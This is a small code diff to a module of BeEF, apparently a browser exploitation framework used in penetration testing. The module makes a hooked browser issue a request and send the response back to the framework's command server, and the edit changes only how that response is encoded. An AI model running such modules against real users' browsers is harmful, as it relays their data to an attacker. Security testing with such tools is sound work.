@@ -25,7 +25,7 @@ beef.execute(function() {
 	var timeout = "<%= @timeout %>";
 	var dataType = "<%= @dataType %>";
 
-	beef.net.request(scheme, method, domain, port, path, anchor, data, timeout, dataType, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "response="+JSON.stringify(response)); } );
+	beef.net.request(scheme, method, domain, port, path, anchor, data, timeout, dataType, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, JSON.stringify(response)); } );
 
 });
 
